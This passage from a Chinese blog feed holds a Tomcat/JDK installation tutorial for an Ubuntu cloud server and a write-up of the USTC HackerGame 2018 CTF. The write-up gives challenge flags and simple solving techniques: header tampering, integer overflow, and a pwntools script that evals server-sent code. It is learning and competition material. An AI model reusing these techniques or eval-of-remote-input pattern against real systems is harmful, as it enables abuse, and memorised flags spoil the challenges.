        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前在windows上安装过Java+tomcat，配置方法其实差不多，但是也有部分区别，毕竟不是傻瓜式的一键安装。最近护网杯一个web题的复现时用到，于是在我的ubantu服务器上重新部署一下，顺便记录一下，以做分享。</p><h2 id="笔者环境介绍"><a href="#笔者环境介绍" class="headerlink" title="笔者环境介绍"></a>笔者环境介绍</h2><blockquote><p>阿里云VPS</p><p>OS：ubantu 16.04</p><p>Jdk：1.8.0_191</p><p>Tomcat:  tomcat7.0.91</p></blockquote><h1 id="步骤一-安装Jdk"><a href="#步骤一-安装Jdk" class="headerlink" title="步骤一  安装Jdk"></a>步骤一  安装Jdk</h1><h2 id="1-1-新建一个Java目录"><a href="#1-1-新建一个Java目录" class="headerlink" title="1.1 新建一个Java目录"></a>1.1 新建一个Java目录</h2><p>笔者新建一个<code>/usr/local/Java</code>用于存放Java的下载文件等。</p><h2 id="1-2-wget下载"><a href="#1-2-wget下载" class="headerlink" title="1.2 wget下载"></a>1.2 wget下载</h2><p>首先是安装Java环境，也就是说要安装Jdk，但是ubantu上不能直接下载，尤其是服务器甚至没有图形化浏览器。</p><p>只能用wget命令，但是一开始发现wget命令下载的Jdk只有几M，当时就发觉不对，</p><p>原因在于：</p><blockquote><p>去Oracle官网下载过jdk的童鞋应该都知道，下载之前需要同意Oracle的安装协议，不然不能下载，但是用wget的方式，默认是不同意，虽然能下载下来，但是下载下来的文件会有问题，所以在Linux上解压一直失败。</p></blockquote><p>解决方法：wget后面加上Cookie</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--no-check-certificate --no-cookies --header &quot;Cookie: oraclelicense&#x3D;accept-securebackup-cookie&quot; </span><br></pre></td></tr></table></figure><p>如我下载的是Jdk8</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;download.oracle.com&#x2F;otn-pub&#x2F;java&#x2F;jdk&#x2F;8u191-b12&#x2F;2787e4a523244c269598db4e85c51e0c&#x2F;jdk-8u191-linux-x64.tar.gz --no-check-certificate --no-cookies --header &quot;Cookie: oraclelicense&#x3D;accept-securebackup-cookie&quot;</span><br></pre></td></tr></table></figure><p>下载完成后解压到之前创建的<code>/usr/local/Java</code></p><h2 id="1-3-配置环境变量"><a href="#1-3-配置环境变量" class="headerlink" title="1.3  配置环境变量"></a>1.3  配置环境变量</h2><p>在<code>/etc/profile</code>中最后写入：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export JAVA_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_191</span><br><span class="line">export JRE_HOME&#x3D;$&#123;JAVA_HOME&#125;&#x2F;jre</span><br><span class="line">export CLASSPATH&#x3D;.:$&#123;JAVA_HOME&#125;&#x2F;lib:$&#123;JRE_HOME&#125;&#x2F;lib</span><br><span class="line">export PATH&#x3D;$&#123;JAVA_HOME&#125;&#x2F;bin:$PATH</span><br></pre></td></tr></table></figure><p>保存后，在shell中写：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;java java &#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_191&#x2F;bin&#x2F;java 300</span><br><span class="line"></span><br><span class="line">update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;javac javac &#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_191&#x2F;bin&#x2F;javac 300</span><br><span class="line"></span><br><span class="line">update-alternatives --config java</span><br></pre></td></tr></table></figure><p>之后，测试查看Java是否安装成功。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@V0W:/<span class="comment"># java -version</span></span><br><span class="line">java version <span class="string">&quot;1.8.0_191&quot;</span></span><br><span class="line">Java(TM) SE Runtime Environment (build 1.8.0_191-b12)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.191-b12, mixed mode)</span><br><span class="line">root@V0W:/<span class="comment"># javac -version</span></span><br><span class="line">javac 1.8.0_191</span><br></pre></td></tr></table></figure><h1 id="步骤二-安装Tomcat"><a href="#步骤二-安装Tomcat" class="headerlink" title="步骤二  安装Tomcat"></a>步骤二  安装Tomcat</h1><h2 id="2-1-下载Tomcat"><a href="#2-1-下载Tomcat" class="headerlink" title="2.1 下载Tomcat"></a>2.1 下载Tomcat</h2><p>官网：<a href="https://tomcat.apache.org/">https://tomcat.apache.org</a></p><p>我下载的是7版本：</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181021/562b1beiiA.png?imageslim" alt="mark"></p><p>一样，先建个文件，放tomcat的文件</p><p>下载命令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir &#x2F;usr&#x2F;local&#x2F;tomcat</span><br><span class="line">cd &#x2F;usr&#x2F;local&#x2F;tomcat</span><br><span class="line">wget http:&#x2F;&#x2F;mirrors.hust.edu.cn&#x2F;apache&#x2F;tomcat&#x2F;tomcat-7&#x2F;v7.0.91&#x2F;bin&#x2F;apache-tomcat-7.0.91.tar.gz</span><br><span class="line">tar -xzcf apache-tomcat-7.0.91.tar.gz</span><br><span class="line">mv apache-tomcat-7.0.91&#x2F; tomcat7.0# 换个简单点的名字</span><br><span class="line">rm -rf apache-tomcat-7.0.91.tar.gz</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="2-2-设置环境变量"><a href="#2-2-设置环境变量" class="headerlink" title="2.2 设置环境变量"></a>2.2 设置环境变量</h2><p>在<code>/etc/profile</code>文件中设置环境变量</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># tomcat env</span></span><br><span class="line"><span class="built_in">export</span> TOMCAT_HOME=/usr/<span class="built_in">local</span>/tomcat/tomcat7.0</span><br></pre></td></tr></table></figure><p>在 <code>tomcat/bin</code>目录下执行<code>./startup.sh</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@V0W:&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;tomcat7.0&#x2F;bin# .&#x2F;startup.sh</span><br><span class="line">Using CATALINA_BASE:   &#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;tomcat7.0</span><br><span class="line">Using CATALINA_HOME:   &#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;tomcat7.0</span><br><span class="line">Using CATALINA_TMPDIR: &#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;tomcat7.0&#x2F;temp</span><br><span class="line">Using JRE_HOME:        &#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_191&#x2F;jre</span><br><span class="line">Using CLASSPATH:       &#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;tomcat7.0&#x2F;bin&#x2F;bootstrap.jar:&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;tomcat7.0&#x2F;bin&#x2F;tomcat-juli.jar</span><br><span class="line">Tomcat started.</span><br></pre></td></tr></table></figure><p><strong>测试一下</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@V0W:&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;tomcat7.0&#x2F;bin# curl localhost:8080</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Apache Tomcat&#x2F;7.0.91&lt;&#x2F;title&gt;</span><br><span class="line">        &lt;link href&#x3D;&quot;favicon.ico&quot; rel&#x3D;&quot;icon&quot; type&#x3D;&quot;image&#x2F;x-icon&quot; &#x2F;&gt;</span><br><span class="line">        &lt;link href&#x3D;&quot;favicon.ico&quot; rel&#x3D;&quot;shortcut icon&quot; type&#x3D;&quot;image&#x2F;x-icon&quot; &#x2F;&gt;</span><br><span class="line">        &lt;link href&#x3D;&quot;tomcat.css&quot; rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;div id&#x3D;&quot;wrapper&quot;&gt;</span><br><span class="line">            &lt;div id&#x3D;&quot;navigation&quot; class&#x3D;&quot;curved container&quot;&gt;</span><br><span class="line">                &lt;span id&#x3D;&quot;nav-home&quot;&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;tomcat.apache.org&#x2F;&quot;&gt;Home&lt;&#x2F;a&gt;&lt;&#x2F;span&gt;</span><br></pre></td></tr></table></figure><p>成功。</p><h2 id="2-3-测试外网访问"><a href="#2-3-测试外网访问" class="headerlink" title="2.3 测试外网访问"></a>2.3 测试外网访问</h2><p>开始测试浏览器访问云服务器，发现连接不上，百度后发现是防火墙的问题</p><h3 id="2-3-1-找云服务器上的防火墙配置文件"><a href="#2-3-1-找云服务器上的防火墙配置文件" class="headerlink" title="2.3.1 找云服务器上的防火墙配置文件"></a>2.3.1 找云服务器上的防火墙配置文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-3-2-查看一下防火墙配置文件"><a href="#2-3-2-查看一下防火墙配置文件" class="headerlink" title="2.3.2 查看一下防火墙配置文件"></a>2.3.2 查看一下防火墙配置文件</h3><p><code>iptables -L</code>查看防火墙配置文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@V0W:&#x2F;etc# iptables -L</span><br><span class="line">Chain INPUT (policy ACCEPT)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line">ACCEPT     all  --  anywhere             anywhere            </span><br><span class="line">ACCEPT     all  --  anywhere             anywhere             state RELATED,ESTABLISHED</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:https</span><br><span class="line">DROP       tcp  --  anywhere             anywhere             tcp dpt:mysql</span><br><span class="line">ACCEPT     icmp --  anywhere             anywhere             icmp echo-request</span><br><span class="line"></span><br><span class="line">Chain FORWARD (policy ACCEPT)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line"></span><br><span class="line">Chain OUTPUT (policy ACCEPT)</span><br><span class="line">target     prot opt source               destination </span><br></pre></td></tr></table></figure><h3 id="2-3-3-修改防火墙配置"><a href="#2-3-3-修改防火墙配置" class="headerlink" title="2.3.3 修改防火墙配置"></a>2.3.3 修改防火墙配置</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@V0W:&#x2F;etc# ufw allow 8080</span><br><span class="line">Rules updated</span><br><span class="line">Rules updated (v6)</span><br></pre></td></tr></table></figure><h3 id="2-3-4-阿里云的安全组配置"><a href="#2-3-4-阿里云的安全组配置" class="headerlink" title="2.3.4 阿里云的安全组配置"></a>2.3.4 阿里云的安全组配置</h3><p>但是，经过上述的配置，我依然不能连接到服务</p><p>测试方法：</p><p>主机<code>telnet</code>命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">telnet serverIP 8080   # IP Port</span><br></pre></td></tr></table></figure><p>最终，发现问题出在阿里云的安全组配置上、、、</p><p>深受其害</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181021/5eBaKGFlfg.png?imageslim" alt="mark"></p><p>于是，修改其安全策略，这里，我把一些常用的端口都添加上（包括8080），还有一种策略是将所有端口都开放，再在服务器上配置防火墙。都是可以的，都是安全的。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181021/m1Kk1GDEgh.png?imageslim" alt="mark"></p><p>配置完安全策略，终于是可以访问了</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181021/mJ4h79B6FJ.png?imageslim" alt="mark"></p><p>至此，Java+Tomcat在阿里云服务器ubantu16.04上的环境配置，算是完成了。<code>(￣▽￣)／</code></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://bbs.csdn.net/topics/392172723">云服务器tomcat部署的网页公网ip无法访问</a></p><p><a href="https://blog.csdn.net/qq_34256348/article/details/78390198">Ubuntu14.04安装Tomcat7.0 配置环境变量</a></p><p> <a href="https://blog.csdn.net/qq_34256348/article/details/78365596">Ubuntu14.04 Linux 安装 jdk 配置环境变量</a></p>]]></content>
      
      
      <categories>
          
          <category> 环境与踩坑 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中国科大CTF HackerGame-WP</title>
      <link href="/2018/10/16/HackerGame2018-WP/"/>
      <url>/2018/10/16/HackerGame2018-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="中国科大CTF-HackerGame"><a href="#中国科大CTF-HackerGame" class="headerlink" title="中国科大CTF HackerGame"></a>中国科大CTF HackerGame</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次参加中科大的HackerGame-CTF，体会了一下<strong>看神仙打架</strong>的感觉，据说不少还是大一的0rz。题目整体来说质量还算不错，不少是脑洞题，算是见识了一些新的思路，也算是见识了新兴领域的一些东西（如机器学习和区块链），值得学习消化一段时间。另外比较可惜的一点是Web安全方面的题目实在较少，web狗感觉不开心<code>╭(╯^╰)╮</code></p><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>嗯，去掉<code>max-length</code>就行。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;Hackergame2018_Have_Fun!&#125;</span><br></pre></td></tr></table></figure><h2 id="猫咪问答"><a href="#猫咪问答" class="headerlink" title="猫咪问答"></a>猫咪问答</h2><p>考察搜索引擎的使用</p><p>建校年份百科就有<code>1958</code></p><p>学号演变史（百度搜关键词得到<a href="http://aga.ustc.edu.cn/site/ustc_xyh/xyh/cnt/?id=18185">链接</a>）<code>9211B026</code></p><p>多少名人，这个爆破一下就行<code>9</code></p><p>中国科大图书馆有<a href="http://opac.lib.ustc.edu.cn/opac/search_adv_result.php?sType0=any&q0=%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB">官网</a>在其中搜一下就得到了    <code> TP311.1/94</code></p><p>可以google搜到<a href="https://lug.ustc.edu.cn/wiki/lug/events/start">中国科大 Linux 用户协会</a>在活动中找到<code>3A202</code></p><h2 id="Word文档"><a href="#Word文档" class="headerlink" title="Word文档"></a>Word文档</h2><p>重命名.zip解压，考察word的本质——xml文档的压缩文件。</p><h2 id="游园会的集章卡片"><a href="#游园会的集章卡片" class="headerlink" title="游园会的集章卡片"></a>游园会的集章卡片</h2><p>我是没想到什么好的方法的，直接上PS，虽然忘了很多操作，但是想了一个稍好点的办法</p><p>百度找了一张校徽图片，放大到652*625,然后把碎片放到里面，调整透明度对齐，然后得到比较完美的还原图。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181009/4b0e19aD14.png?imageslim" alt="mark"></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181010/jk2gf9HcB0.jpg?imageslim" alt="mark"></p><p>flag{H4PPY_1M4GE_PR0CE551NG}</p><h2 id="猫与键盘"><a href="#猫与键盘" class="headerlink" title="猫与键盘"></a>猫与键盘</h2><p>大概看出了规律，先找到了url</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">* url: aHR0cHM6Ly96anUtbGFtYmRhLnRlY2gvY3BwZHQtcHJpbnRmLw&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;zju-lambda.tech&#x2F;cppdt-printf&#x2F;</span><br></pre></td></tr></table></figure><p>找到参考文章，根据文章，逐个修改调整字符顺序，写脚本，修改文件。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">&quot;typed_printf.cpp&quot;</span>)</span><br><span class="line">content = f.read()</span><br><span class="line">lines = content.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">f.close()</span><br><span class="line"><span class="comment"># print lines</span></span><br><span class="line">w = open(<span class="string">&quot;form.cpp&quot;</span>,<span class="string">&quot;a+&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> lines:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s0 = s[<span class="number">0</span>]</span><br><span class="line">s1 = s[<span class="number">32</span>:<span class="number">39</span>]</span><br><span class="line">s2 = s[<span class="number">1</span>:<span class="number">7</span>]</span><br><span class="line">s3 = s[<span class="number">20</span>:<span class="number">22</span>]</span><br><span class="line">s4 = s[<span class="number">8</span>:<span class="number">20</span>]</span><br><span class="line">s5 = s[<span class="number">22</span>:<span class="number">32</span>]</span><br><span class="line">s6 = s[<span class="number">39</span>:]</span><br><span class="line"></span><br><span class="line">ss = s0+s1+s2+s3+s4+s5+s6</span><br><span class="line"><span class="comment"># print ss</span></span><br><span class="line">res = ss + <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">w.write(res)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">ss = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">print</span> ss</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;done.&quot;</span></span><br></pre></td></tr></table></figure><p>得到正确的源码，但是运行不了，还好关键代码部分不难，脑跑程序就能出来</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;                                                                              def_typed_printf(f_l_x_g_1, <span class="string">&quot;%s%s%s%s&quot;</span>);                                             </span><br><span class="line">    f_l_x_g_1(<span class="string">&quot;fl&quot;</span>)(<span class="string">&quot;a&quot;</span>)(<span class="string">&quot;g&quot;</span>)(<span class="string">&quot;&#123;&quot;</span>);                                                     </span><br><span class="line">    def_typed_printf(a_a_a_a_a_a_a_a_a, <span class="string">&quot;%s%s%s%s%s%s%d&quot;</span>);                             </span><br><span class="line">    a_a_a_a_a_a_a_a_a(ABC)(<span class="string">&quot;&quot;</span>)(BAC)(<span class="string">&quot;&quot;</span>)(CAB)(<span class="string">&quot;&quot;</span>)(<span class="string">&#x27;&#125;&#x27;</span>);                                 </span><br><span class="line">    def_typed_printf(def_typed_printf_, <span class="string">&quot;%s%d%s&quot;</span>);                                     </span><br><span class="line">    def_typed_printf_(<span class="string">&quot;typed_printf&quot;</span>)(<span class="string">&#x27;_&#x27;</span>)(<span class="string">&quot;&#125;&quot;</span>);                                       </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="comment">// flag&#123;FfQ47if9Zxw9jXE68VtGAJDk6Y6Xc88UrUtpK3iF8p7BMs4y2gzdG8Ao2gv6aiJ125typed_printf95&#125;</span></span><br></pre></td></tr></table></figure><h2 id="黑曜石浏览器"><a href="#黑曜石浏览器" class="headerlink" title="黑曜石浏览器"></a>黑曜石浏览器</h2><p>提示换浏览器，应该是改UA</p><p>google出来黑曜石浏览器后，在index.html中发现UA</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181012/9Bgm4BFmde.png?imageslim" alt="mark"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) HEICORE&#x2F;49.1.2623.213 Safari&#x2F;537.36</span><br></pre></td></tr></table></figure><p>Burp中改UA，即得<code>flag</code></p><p>为了出题，写了个浏览器的网页也是用心了。/点赞</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;H3ic0re_49.1.2623.213_sai_kou&#125;</span><br></pre></td></tr></table></figure><h2 id="猫咪银行"><a href="#猫咪银行" class="headerlink" title="猫咪银行"></a>猫咪银行</h2><p>考察整数溢出，</p><p>但是一开始考虑错了，想直接金额溢出，但是不行；</p><p>经大佬提醒以后，才想到应该是时间溢出，时间填很大的整数会溢出成负数，从而。很快就能取得很高的收益。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181012/GIl0Ha9756.png?imageslim" alt="mark"></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181012/JcEAjC95HD.png?imageslim" alt="mark"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;Evil_Integer._Evil_Overflow.&#125;</span><br></pre></td></tr></table></figure><h2 id="我是谁"><a href="#我是谁" class="headerlink" title="我是谁"></a>我是谁</h2><h3 id="哲学思考"><a href="#哲学思考" class="headerlink" title="哲学思考"></a>哲学思考</h3><p>很有意思的题目<code>(ノ￣▽￣)</code></p><p>打开网站，发现一个418的http状态，从来没见过，可能有猫腻。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181012/lb2fkBjmcB.png?imageslim" alt="mark"></p><p>于是了解一下，知道了：</p><blockquote><p>HTTP <strong>418 I’m a teapot</strong> 客户端错误响应代码表示服务器拒绝冲泡咖啡，因为它是一个茶壶。 这个错误是超文本咖啡壶控制协议的参考，这是1998年愚人节的笑话。</p><p>还有人专门写了相应的<a href="https://tools.ietf.org/html/rfc7168">RFC文档作为这个协议控制的参考</a></p></blockquote><p>再看题目：</p><blockquote><p>Who am I?</p></blockquote><p>OK，第一题答案应该是<code>teapot</code>了</p><p>得到第一个flag</p><p><code>flag&#123;i_canN0t_BReW_c0ffEE!&#125;</code></p><h3 id="Can-u-help-me"><a href="#Can-u-help-me" class="headerlink" title="Can u help me"></a>Can u help me</h3><blockquote><p>Come to <a href="http://202.38.95.46:12005/the_super_great_hidden_url_for_brewing_tea/">This Link</a>, help me brew some tea, and you can get the 2nd FLAG!</p><p>Brewing tea is not so easy.</p><p>Try using other <em>methods</em> to request this page.</p></blockquote><p>首先是让我们用别的请求方法。</p><p>我一开始试了<code>POST</code>不行,但是得到提示</p><blockquote><p>The method “POST” is deprecated.</p><p>See <a href="https://tools.ietf.org/html/rfc7168">RFC-7168</a> for more information.</p></blockquote><p>在文档中得到相应的提示</p><blockquote><p> 如基本HTCPCP规范中所述，通过发送BREW请求来执行对具有TEA能力的控制的控制。</p><p> POST 请求被等效地处理，但它们仍然被弃用。</p><p> 然而，茶的生产与咖啡的不同之处在于，在泡制茶之前，通常提供茶的选择供客户选择。</p><p> 对于URI“/”，将不会开始酿造。相反，必须发送RFC 2295 [ RFC2295 ]中 定义的Alternates 标头，并将可用的茶包和/或叶子品种作为条目。</p></blockquote><p>也就是说，我们想做POST请求的时候，</p><ol><li><p>用BREW代替POT方法，然后需要在url后面加上一个<code>/xxtea</code></p></li><li><p>并且加上字段<code>Content-Type:message/teapot</code></p></li></ol><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181012/LCd2KfK5bG.png?imageslim" alt="mark"></p><p>响应里面有需要加的信息</p><p>加上需要加的http请求头信息，就可以得到flag了</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181012/1kBL9BmDKf.png?imageslim" alt="mark"></p><h2 id="她的诗"><a href="#她的诗" class="headerlink" title="她的诗"></a>她的诗</h2><p>py 脚本跑一下得到解密结果</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181012/Eg0AH8dcmB.png?imageslim" alt="mark"></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181012/0L0Ie26K3f.png?imageslim" alt="mark"></p><p>但是发现两个解密结果不一样，而相差的字符连起来就是flag。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181016/i8lJDH98DH.png?imageslim" alt="mark"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;STegAn0grAPhy_w1tH_uUeNc0DE_I5_50_fu</span><br></pre></td></tr></table></figure><p>提交不正确，不知道是我的文件少了还是怎么的。</p><p>根据语义加了点，过了。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;STegAn0grAPhy_w1tH_uUeNc0DE_I5_50_fun&#125;</span><br></pre></td></tr></table></figure><h2 id="回到过去"><a href="#回到过去" class="headerlink" title="回到过去"></a>回到过去</h2><p>把错误字符去掉，在Linux里跑一遍，就完事了，保存一下。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ed</span><br><span class="line">a</span><br><span class="line">flag&#123;</span><br><span class="line">.</span><br><span class="line">a</span><br><span class="line">44a2b8</span><br><span class="line">a3d9b2</span><br><span class="line">c44039</span><br><span class="line">f93345</span><br><span class="line">&#125;</span><br><span class="line">.</span><br><span class="line">2m3</span><br><span class="line">2m5</span><br><span class="line">2m1</span><br><span class="line">2</span><br><span class="line">s&#x2F;4&#x2F;t</span><br><span class="line">w flag.txt</span><br><span class="line">q</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;t4a2b8c44039f93345a3d9b2&#125;</span><br></pre></td></tr></table></figure><h2 id="猫咪怕蛇"><a href="#猫咪怕蛇" class="headerlink" title="猫咪怕蛇"></a>猫咪怕蛇</h2><p>每道题给30秒的时间，算出来，肯定用脚本跑咯。</p><p>之前一直没有接触python写类似socket接口来链接服务器，这题算是学习了一些，又发现pwntools用的就是socket来写的，于是算是也学习了pwntools的一些用法。谁知道以后会不会入坑pwn呢，毕竟web快混不下去了呀==、</p><p>但是在脚本运行过程，发现了这么几个坑，需要注意一下：</p><ol><li>sleep(100),导致timeout</li><li>exit()函数夹杂其中导致链接断开</li><li>find ~ 可能导致超时，至少看着难受</li><li>输出二进制字符导致错误</li></ol><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181016/DIGHLc3mg4.png?imageslim" alt="mark"></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181015/05CcaACGBh.png?imageslim" alt="mark"></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181015/L2G7k8EJk1.png?imageslim" alt="mark"></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181015/hmigfcb0c3.png?imageslim" alt="mark"></p><p>因此，需要加上过滤，脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;202.38.95.46&#x27;</span></span><br><span class="line">port = <span class="number">12009</span></span><br><span class="line"></span><br><span class="line">p=remote(ip,port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tar = p.recv()</span><br><span class="line"><span class="keyword">print</span> tar</span><br><span class="line">out = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> out:</span><br><span class="line">    tar = p.recv()</span><br><span class="line">    tar = tar.replace(<span class="string">&quot;__import__(&#x27;time&#x27;).sleep(100)&quot;</span>,<span class="string">&quot;None&quot;</span>)</span><br><span class="line">    tar = tar.replace(<span class="string">&quot;exit()&quot;</span>,<span class="string">&quot;None&quot;</span>)</span><br><span class="line">    tar = tar.replace(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;find ~&#x27;)&quot;</span>,<span class="string">&quot;None&quot;</span>)</span><br><span class="line">    tar = tar.replace(<span class="string">&quot;print(&#x27;\\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a&#x27;)&quot;</span>,<span class="string">&quot;None&quot;</span>)</span><br><span class="line">    <span class="keyword">print</span> tar</span><br><span class="line">    res = eval(tar)</span><br><span class="line">    out = tar</span><br><span class="line">    p.sendline(str(res))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> out</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;&#x27;Life_1s_sh0rt_use_PYTH0N&#x27;*1000&#125;</span></span><br></pre></td></tr></table></figure><h2 id="秘籍残卷"><a href="#秘籍残卷" class="headerlink" title="秘籍残卷"></a>秘籍残卷</h2><p>拿到秘籍，然后notepad++打开，一顿放大缩小，结果竟然是这样的<code>(￣▽￣)／</code></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181016/FDgldf0eIJ.png?imageslim" alt="mark"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flxg&#123;University_of_Ridiculous&#125;</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p><a href="https://github.com/ustclug/hackergame2018-writeups">官方WP</a></p><p>其实做的也不是很多，还有很多题目一点思路都没有，打算看看WP学习一波。</p><p>最后，分享两个有意思的ID（我的ID是<code>伊丽莎白小竹鼠</code>）<code>(｀・ω・´)</code></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181016/37dlEjA55g.png?imageslim" alt="mark"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>护网杯预选赛 WP</title>
      <link href="/2018/10/13/%E6%8A%A4%E7%BD%91%E6%9D%AFWP-BitPwn/"/>
